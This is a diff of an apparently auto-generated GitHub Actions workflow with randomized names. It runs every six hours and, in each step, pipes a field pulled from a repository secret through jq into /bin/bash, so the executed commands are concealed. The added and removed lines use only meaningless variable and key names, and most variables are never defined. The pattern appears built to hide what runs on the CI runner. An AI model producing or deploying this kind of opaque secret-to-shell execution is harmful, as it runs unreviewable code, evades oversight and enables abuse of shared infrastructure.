@@ -1,26 +1,24 @@
 name: dilongmai2376
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
-jobs:  # 952
+    - cron: '0 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dilongmai2376
         env:
-          s854: ${{ secrets.s854 }}
+          e02012: ${{ secrets.e02012 }}
         run: |
-          echo $s854 | jq -r .wqqum18 | /bin/bash
-          echo $amvjb505 | jq -r .irg42992 | /bin/bash
-          echo $cofu073 | jq -r .f7 | /bin/bash
-          echo $nejt2438 | jq -r .tcrx7318 | /bin/bash
-          echo $dl000 | jq -r .jr4520 | /bin/bash
-          echo $f71 | jq -r .bqqye2504 | /bin/bash
-          echo $lrxpq38937 | jq -r .s92 | /bin/bash
-          echo $prqa8250 | jq -r .vl405 | /bin/bash
-          echo $qld74 | jq -r .m75 | /bin/bash
-          echo $tsukg00 | jq -r .ugd79638 | /bin/bash
+          echo $e02012 | jq -r .rww48005 | /bin/bash
+          echo $q711 | jq -r .p8 | /bin/bash
+          echo $kzgj4 | jq -r .pt82911 | /bin/bash
+          echo $q54 | jq -r .a6302 | /bin/bash
+          echo $rivv22026 | jq -r .ootvh01 | /bin/bash
+          echo $zq9459 | jq -r .slb2803 | /bin/bash
+          echo $hxd8142 | jq -r .a260 | /bin/bash
 
